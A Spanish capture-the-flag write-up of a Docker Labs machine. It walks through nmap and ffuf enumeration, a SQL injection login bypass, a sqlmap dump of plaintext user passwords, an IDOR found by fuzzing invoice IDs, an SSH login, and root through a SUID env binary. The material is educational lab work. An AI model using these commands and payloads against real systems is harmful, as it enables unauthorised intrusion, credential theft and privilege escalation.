Writeup: Máquina Docker Labs
Autor: kur0
Dificultad: ¿?
Fecha: 22 de Junio, 2026

Flujo de Ataque (Killchain)
Ping -> Nmap (SSH + HTTP) -> ffuf -> /bills/panel.php -> SQLi (mario) -> SQLMap (admin:admin123) -> Login admin -> IDOR (xyc724) -> Credenciales duque -> SSH -> SUID env -> root

1. Reconocimiento y Enumeración
Escaneo de Red (Ping)
Primero tire un ping para ver si la maquina estaba activa y adivinar el sistema operativo:

Bash
ping -c 4 172.17.0.2
Plaintext
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.070 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.055 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.051 ms
64 bytes from 172.17.0.2: icmp_seq=4 ttl=64 time=0.061 ms
Como el TTL es 64, confirmo que es una maquina Linux.

Escaneo de Puertos (Nmap)
Despues pase nmap para ver que puertos estaban abiertos y que versiones corrian:

Bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn -oN scan 172.17.0.2
Resultados:

Puerto 22/tcp: SSH (OpenSSH 8.9p1 Ubuntu)

Puerto 80/tcp: HTTP (Apache httpd 2.4.52)

2. Enumeración Web
Como vi el puerto 80 abierto, use ffuf para buscar directorios ocultos:

Bash
ffuf -w ~/Desktop/Lists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt \
  -u http://172.17.0.2/FUZZ \
  -recursion -e .php,.html -v -o ffufscan
El flag -recursion me sirvio para que busque dentro de las carpetas que iba encontrando. Encontre esto:

/intranet/

/bills/

/bills/index.php (Aca habia un login)

/bills/panel.php

3. Explotación y Acceso Inicial
SQL Injection
En el login de /bills/index.php, probe una inyeccion SQL basica en el usuario:

SQL
' OR 1=1-- -
Entro directo, pero me logueo como "mario". Mario es un usuario comun y no tenia acceso al panel de admin.

SQLMap
Para sacar mas usuarios, intercepte la peticion del login y se la pase a sqlmap:

Bash
sqlmap -u "http://172.17.0.2/bills/" \
  --data="username=*&passwor=fht" \
  --cookie="PHPSESSID=dkoin5nnl92q4f6h5u3akmlpb0" \
  -p username \
  --level=3 --risk=2 \
  --dbms=mysql \
  --dump \
  --batch
Sqlmap encontro varias vulnerabilidades y me dumpeo la tabla de usuarios:

Plaintext
Database: register
Table: users

| id | passwd    | username |

| 1  | mario123  | mario    |
| 2  | jesus2026 | jesus    |
| 3  | admin123  | admin    |

Aca consegui las credenciales del admin: admin:admin123.

4. IDOR
Me loguee como admin. Vi que en el panel, las facturas se cargaban con un ID en la URL tipo ?id=xya456. Era siempre "xy", una letra y tres numeros.

Arme un bucle rapido en bash para probar todas las combinaciones (son 26.000) y use ffuf para mandarlas, filtrando por el tamaño de la respuesta para ver cual era distinta:

Bash
ffuf -w <(for l in {a..z}; do for n in {0..9}{0..9}{0..9}; do echo "$l$n"; done; done) \
  -u "http://172.17.0.2/bills/panel.php?id=xyFUZZ" \
  -H "Cookie: PHPSESSID=edptot42qkohno15r27g1jfqif" \
  -mr "Detalle de Factura" \
  -c -t 20 -fs 5906
Me salto el ID c724 con un tamaño distinto al resto.

Fui a http://172.17.0.2/bills/panel.php?id=xyc724 y en el detalle decia:
USUARIO: duque
PASSWORD: duquelaje81029557!

5. Acceso SSH
Con esas credenciales me conecte por SSH:

Bash
ssh duque@172.17.0.2
Y entre al servidor como el usuario duque.

6. Escalada de Privilegios
El usuario duque no podia usar sudo, asi que busque binarios con permisos SUID mal configurados:

Bash
find / -perm -4000 -type f 2>/dev/null | xargs ls -la
Encontre este que me llamo la atencion porque tenia propietario root:

Plaintext
-rwsr-xr-x 1 root root 43976 Jan 23 10:51 /usr/bin/env
Busque en GTFOBins y vi que se podia usar env para escalar. Ejecute esto agregando el flag -p para mantener los privilegios:

Bash
/usr/bin/env /bin/sh -p
Revise mi usuario para confirmar:

Bash
# id
uid=1000(duque) gid=1000(duque) euid=0(root) groups=1000(duque)

# whoami
root
Ya era root, maquina completada.
